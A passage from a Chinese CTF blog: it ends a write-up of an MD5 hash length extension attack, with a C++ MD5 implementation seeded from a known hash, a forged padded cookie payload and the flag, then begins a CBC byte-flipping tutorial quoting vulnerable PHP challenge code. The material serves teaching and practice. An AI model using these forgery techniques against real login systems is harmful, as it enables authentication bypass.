class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cmath&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line">typedef unsigned int uint;</span><br><span class="line">typedef long long LL;</span><br><span class="line">const int MAXN = 1e6 + 5;</span><br><span class="line">const int mod = 1e9 + 7;</span><br><span class="line"> </span><br><span class="line">struct MD5 &#123;</span><br><span class="line"> </span><br><span class="line">    typedef void (MD5::*deal_fun)(uint&amp;, uint, uint, uint, uint, uint, uint);//用于定义函数指针数组</span><br><span class="line">    string init_str;//数据字符串</span><br><span class="line">    uint init_arr[1000];//最终的数据数组&#123;进行扩充处理后的数据&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    const static int MAXN = 1e2;</span><br><span class="line"> </span><br><span class="line">    static uint s_state[4];//最开始的默认静态渐变变量</span><br><span class="line"> </span><br><span class="line">    uint state[4];//这个也是默认渐变变量，但是会改变</span><br><span class="line"> </span><br><span class="line">    static uint rolarray[4][4];//位移数组</span><br><span class="line">    static uint mN[4][16];//对M数组的处理</span><br><span class="line"> </span><br><span class="line">    uint curM;//当前处理的直接在整个数据中的位置</span><br><span class="line">    uint lenZ;//数据的总长&#123;进行扩充处理后的数据总长，这个数是64的倍数&#125;</span><br><span class="line">    uint offset;//需要从第几组开始处理</span><br><span class="line">    uint Tarr[64];//当前保存的T数组数据</span><br><span class="line">    uint Memory[64 + 5];//当前要处理的64个字节数据</span><br><span class="line">    uint M[16];//将64个字节数据分为16个数</span><br><span class="line"> </span><br><span class="line">    MD5();</span><br><span class="line">    MD5(string str, int noffset);</span><br><span class="line"> </span><br><span class="line">    //数据处理函数</span><br><span class="line">    inline uint F(uint X, uint Y, uint Z);</span><br><span class="line">    inline uint G(uint X, uint Y, uint Z);</span><br><span class="line">    inline uint H(uint X, uint Y, uint Z);</span><br><span class="line">    inline uint I(uint X, uint Y, uint Z);</span><br><span class="line"> </span><br><span class="line">    //循环左移函数</span><br><span class="line">    uint ROL(uint s, uint ws);</span><br><span class="line"> </span><br><span class="line">    //过程处理函数</span><br><span class="line">    inline void FF(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line">    inline void GG(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line">    inline void HH(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line">    inline void II(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line"> </span><br><span class="line">    //生成T数组单个数据的函数</span><br><span class="line">    inline uint T(uint i);</span><br><span class="line"> </span><br><span class="line">    //将总数据中的64个字节移到Memory数组中</span><br><span class="line">    void data_Init();</span><br><span class="line"> </span><br><span class="line">    //建立M数组</span><br><span class="line">    void create_M_arr();</span><br><span class="line"> </span><br><span class="line">    //移动a,b,c,d，规则在前面介绍了</span><br><span class="line">    void l_data_change(uint *buf);</span><br><span class="line"> </span><br><span class="line">    //产生T数组</span><br><span class="line">    void create_T_arr();</span><br><span class="line"> </span><br><span class="line">    //得到最终MD5值</span><br><span class="line">    string get_MD5();</span><br><span class="line"> </span><br><span class="line">    //过程处理</span><br><span class="line">    void processing();</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">uint MD5::rolarray[4][4] = &#123;</span><br><span class="line">    &#123; 7, 12, 17, 22 &#125;,</span><br><span class="line">    &#123; 5, 9, 14, 20 &#125;,</span><br><span class="line">    &#123; 4, 11, 16, 23 &#125;,</span><br><span class="line">    &#123; 6, 10, 15, 21 &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">uint MD5::mN[4][16] = &#123;</span><br><span class="line">    &#123; 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 &#125;,</span><br><span class="line">    &#123; 1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12 &#125;,</span><br><span class="line">    &#123; 5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2 &#125;,</span><br><span class="line">    &#123; 0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9 &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">传统渐变变量</span><br><span class="line">0x67452301,</span><br><span class="line">0xefcdab89,</span><br><span class="line">0x98badcfe,</span><br><span class="line">0x10325476</span><br><span class="line">这四个东西是可以根据要求更改的，如果取上述几个数则和经常用的MD5算出的结果是一样的</span><br><span class="line">对了，由于有些数据是静态的，改变之后不会进行需要重新进行复制</span><br><span class="line">*/</span><br><span class="line"> </span><br><span class="line">uint MD5::s_state[4] = &#123;</span><br><span class="line">    0xb2801557,</span><br><span class="line">    0x06f3656c,</span><br><span class="line">    0x644f6d37,</span><br><span class="line">    0xc7b53ce5</span><br><span class="line">&#125;;//已经按小端规则反处理哈希值了</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">MD5::MD5() &#123;&#125;</span><br><span class="line"> </span><br><span class="line">MD5::MD5(string str, int noffset = 1) &#123;</span><br><span class="line">    offset = noffset;</span><br><span class="line">    curM = (noffset - 1) * 64;//从0位置处开始处理</span><br><span class="line">    init_str = str;//对数据字符串进行处理</span><br><span class="line">    lenZ = init_str.length();</span><br><span class="line">    memset(init_arr, 0, sizeof(init_arr));</span><br><span class="line"> </span><br><span class="line">    for(int i = 0; i &lt; lenZ; i ++) &#123;</span><br><span class="line">        init_arr[i] = str[i];//最终的数据数组进行赋值</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">        将数据扩充到取模64个字节等于56个字节</span><br><span class="line">        第一个填充0x80，然后就是0x00了</span><br><span class="line">    */</span><br><span class="line">    if(lenZ % 64 != 56) init_arr[lenZ ++] = 0x80;</span><br><span class="line">    while(lenZ % 64 != 56) &#123;</span><br><span class="line">        init_arr[lenZ ++] = 0x00;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /*</span><br><span class="line">        最后8个字节保存了没扩充钱位数的多少，记住是位数的个数不是字节的个数，同时是按照小端规则</span><br><span class="line">    */</span><br><span class="line">    uint lengthbits = init_str.length() * 8;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &amp; 0xff;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &gt;&gt; 8 &amp; 0xff;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &gt;&gt; 16 &amp; 0xff;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &gt;&gt; 24 &amp; 0xff;</span><br><span class="line"> </span><br><span class="line">    //因为uint最多32位所以我们只要考虑四个字节就可以了，虽然实际上要考虑64位，嘿</span><br><span class="line">    lenZ += 4;//这步我没读懂！！！</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    for(int i = 0;i &lt; 4;i ++)&#123;</span><br><span class="line">        state[i] = s_state[i];//将最开始的默认静态渐变变量赋值给静态渐变变量</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline uint MD5::F(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return (X &amp; Y) | ((~X) &amp; Z);</span><br><span class="line">&#125;</span><br><span class="line">inline uint MD5::G(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return (X &amp; Z) | (Y &amp; (~Z));</span><br><span class="line">&#125;</span><br><span class="line">inline uint MD5::H(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return X ^ Y ^ Z;</span><br><span class="line">&#125;</span><br><span class="line">inline uint MD5::I(uint X, uint Y, uint Z) &#123;</span><br><span class="line">    return Y ^ (X | (~Z));</span><br><span class="line">&#125;</span><br><span class="line">uint MD5::ROL(uint s, uint ws) &#123;</span><br><span class="line">    return (s &lt;&lt; ws) | (s &gt;&gt; (32 - ws));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">inline void MD5::FF(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a = ROL(a + F(b, c, d) + x + ac, s) + b;</span><br><span class="line">    //printf(&quot;ff\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline void MD5::GG(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a = ROL(a + G(b, c, d) + x + ac, s) + b;</span><br><span class="line">    //printf(&quot;gg\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline void MD5::HH(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a = ROL(a + H(b, c, d) + x + ac, s) + b;</span><br><span class="line">    //printf(&quot;hh\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">inline void MD5::II(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a = ROL(a + I(b, c, d) + x + ac, s) + b;</span><br><span class="line">    //printf(&quot;ii\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//这里前面讲了</span><br><span class="line">inline uint MD5::T(uint i) &#123;</span><br><span class="line">    return (uint)((0xffffffff + 1LL) * abs(sin(i)));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//取64个字节放在Memory数组中</span><br><span class="line">void MD5::data_Init() &#123;</span><br><span class="line">    uint tmp = 0;</span><br><span class="line">    for(int i = 0; i &lt; 64; i ++) &#123;</span><br><span class="line">        Memory[i] = init_arr[curM + i];</span><br><span class="line">    &#125;</span><br><span class="line">    curM += 64;//变化位置</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">void MD5::create_T_arr() &#123;</span><br><span class="line">    for(int i = 1; i &lt;= 64; i ++) &#123;</span><br><span class="line">        Tarr[i - 1] = T(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">这里使用了小端将数据存在M数组中，可以稍微思考一下</span><br><span class="line">*/</span><br><span class="line">void MD5::create_M_arr() &#123;</span><br><span class="line">    uint tmp = 0;</span><br><span class="line">    int cnt = 0;</span><br><span class="line">    for(int i = 0; i &lt; 64; i += 4) &#123;</span><br><span class="line">        tmp = 0;</span><br><span class="line">        for(int j = 3; j &gt;= 0; j --) &#123;</span><br><span class="line">            tmp |= Memory[i + j];</span><br><span class="line">            if(j == 0) break;</span><br><span class="line">            tmp &lt;&lt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        M[cnt ++] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//移动a,b,c,d，最后一个移到第一个</span><br><span class="line">void MD5::l_data_change(uint *buf) &#123;</span><br><span class="line">    uint buftmp[4] = &#123;buf[3], buf[0], buf[1], buf[2]&#125;;</span><br><span class="line">    for(int i = 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        buf[i] = buftmp[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void MD5::processing() &#123;</span><br><span class="line">    uint statetmp[4];</span><br><span class="line">    for(int i = 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        statetmp[i] = state[i];</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">        这里的处理只是为了更方便的循环</span><br><span class="line">    */</span><br><span class="line">    uint * a = &amp;statetmp[0];</span><br><span class="line">    uint * b = &amp;statetmp[1];</span><br><span class="line">    uint * c = &amp;statetmp[2];</span><br><span class="line">    uint * d = &amp;statetmp[3];</span><br><span class="line"> </span><br><span class="line">    /*</span><br><span class="line">        产生M数组和T数组</span><br><span class="line">    */</span><br><span class="line">    create_M_arr();</span><br><span class="line">    create_T_arr();</span><br><span class="line"> </span><br><span class="line">    /*</span><br><span class="line">        建立函数指针数组</span><br><span class="line">        循环处理</span><br><span class="line">    */</span><br><span class="line"> </span><br><span class="line">    deal_fun d_fun[4] = &#123;</span><br><span class="line">        &amp;MD5::FF, &amp;MD5::GG, &amp;MD5::HH, &amp;MD5::II</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    for(int i = 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        for(int j = 0; j &lt; 16; j ++) &#123;</span><br><span class="line">            (this -&gt;* d_fun[i])(*a, *b, *c, *d, M[mN[i][j]], rolarray[i][j % 4], Tarr[i * 16 + j]);</span><br><span class="line">            l_data_change(statetmp);//交换a,b,c,d</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    for(int i = 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        state[i] += statetmp[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">string MD5::get_MD5() &#123;</span><br><span class="line">    string result;</span><br><span class="line">    char tmp[15];</span><br><span class="line">    for(int i = 0;i &lt; (lenZ - (offset - 1) * 64) / 64;i ++)&#123;</span><br><span class="line">        data_Init();</span><br><span class="line">        processing();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /*</span><br><span class="line">        最终显示也是用小端</span><br><span class="line">    */</span><br><span class="line"> </span><br><span class="line">    for(int i = 0; i &lt; 4; i ++) &#123;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &amp; 0xff);</span><br><span class="line">        result += tmp;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &gt;&gt; 8 &amp; 0xff);</span><br><span class="line">        result += tmp;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &gt;&gt; 16 &amp; 0xff);</span><br><span class="line">        result += tmp;</span><br><span class="line">        sprintf(tmp, &quot;%02x&quot;, state[i] &gt;&gt; 24 &amp; 0xff);</span><br><span class="line">        result += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main() &#123;</span><br><span class="line">    MD5 md1(&quot;123456789123456adminadmin123456789123456789123456789123456789123admin&quot;,2);</span><br><span class="line">    cout &lt;&lt; md1.get_MD5() &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将运行代码得到的hash值利用getmein写入cookie，将username=admin，passsword=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1ftj00nu1bxj30xp097ach.jpg" alt="image"><br>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p>
<p>参考文章：<br><a href="https://www.cnblogs.com/p00mj/p/6288337.html" target="_blank" rel="noopener">MD5的Hash长度扩展攻击</a><br><a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">科普哈希长度扩展攻击</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/密码学/">密码学</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-CBC字节翻转攻击" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/06/22/CBC字节翻转攻击/" class="article-date">
      <time datetime="2018-06-22T03:35:12.000Z" itemprop="datePublished">2018-06-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/22/CBC字节翻转攻击/">CBC字节翻转攻击</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h4 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>CBC加密是AES加密的一种模式，中文名叫密码分组链接模式（Cipher Block Chaining (CBC)），这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。<br>看下图：<br>IV：随机生成的初始向量<br>Plaintxt：明文数据<br>Ciphertext：密文数据<br>Key：分组加密使用的密钥   </p>
<h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h5><p><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/082113_1459_CBCByteFlip1.png" alt="image">   </p>
<p>首先将我们需要将需要加密的明文按照十六个字节为一组分组，最后一组不满十六字节用特殊字符填补<br>接着系统产生一个十六字节的随机字符串作为初始向量，该向量与第一组明文进行异或操作，再与key进行CBC加密得到第一组密文<br>第一组密文再与下一组明文进行异或操作CBC加密得到第二组密文<br>以此类推……<br>将得到的密文组按顺序拼接到一起就是所得到的密文  </p>
<h5 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h5><p><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/082113_1459_CBCByteFlip2.png" alt="image"><br>首先将密文按十六进制分组<br>第一组密文与key进行CBC解密，再将解密的数据与初始向量异或得到第一组明文<br>接着第一组密文再与下一组CBC解密得到的数据进行异或操作得到第二组明文<br>以此类推……<br>最后拼接得到明文   </p>
<h5 id="异或操作"><a href="#异或操作" class="headerlink" title="异或操作"></a>异或操作</h5><p>CBC字节翻转的关键点就在异或上，所以首先我们要明白异或是什么。<br><img src="https://screenshotscdn.firefoxusercontent.com/images/e68ed912-038b-43ad-8c51-7dde8359fe7d.png" alt="image"><br>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。  </p>
<h5 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h5><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fspt6lq2ufj30w90awdh5.jpg" alt="image"><br>攻击针对的是解密过程<br>第一步：修改  </p>
<p>由图可知，你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。   </p>
<p>所以我们要找到要修改的明文中的那一个字节C，我，上一组密文对应字节为A，本组密文对应字节为B，我们知道了A xor B = C，我们现在现在要将C改变为c，那么知道A XOR B XOR C = 0，则A XOR B XOR C xor c= c。  </p>
<p>这里我们知道B是解密后的数据未知我们不好修改，所以我们可以将A修改a=A xor C xor c ，这样我们就将C替换成了c。  </p>
<p>第二步：修复  </p>
<p>上一步我们将第二组明文修改为了我们想要得到的数据，但是，与此同时，我们也将第一组密文给修改了，这就会导致第一组明文数据被修改，那么我们不能去修改第一组密文，又要使第一组明文数据正确，我们只有利用异或对初始向量下手。  </p>
<p>若原iv为O，新iv为N，错误的第一组明文M = O xor 第一组密文，我们要想得到正确的第一组明文m，那么就去改变N = O xor M xor m，这样就利用异或得到了正确的明文。  </p>
<h5 id="看个例子"><a href="#看个例子" class="headerlink" title="看个例子"></a>看个例子</h5><p>这是iscc的一道题Only admin can see flag<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fspuq0rb5qj30ky0a83z2.jpg" alt="image"><br>查看源码发现一个TXT文件，打开得到PHP代码   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"> //设置随机初始向量</span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//设置cookie的流程调用的函数，返回一个随机的iv和使用该iv加密的post提交的username和password的结果——cipher</span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    //序列化传入数组</span><br><span class="line">    #a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:4:&quot;test&quot;;&#125;</span><br><span class="line">    #第一组明文：a:2:&#123;s:8:&quot;userna</span><br><span class="line">    #第二组明文：me&quot;;s:5:&quot;Admin&quot;;</span><br><span class="line">    #第三组明文：s:8:&quot;password&quot;;s</span><br><span class="line">    #第四组明文：:4:&quot;test&quot;;&#125;</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    //cbc加密</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//检查函数，这里是对cookie中cipher和iv进行CBC翻转的利用点</span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        //进行CBC模式的AES解密</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            //对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t 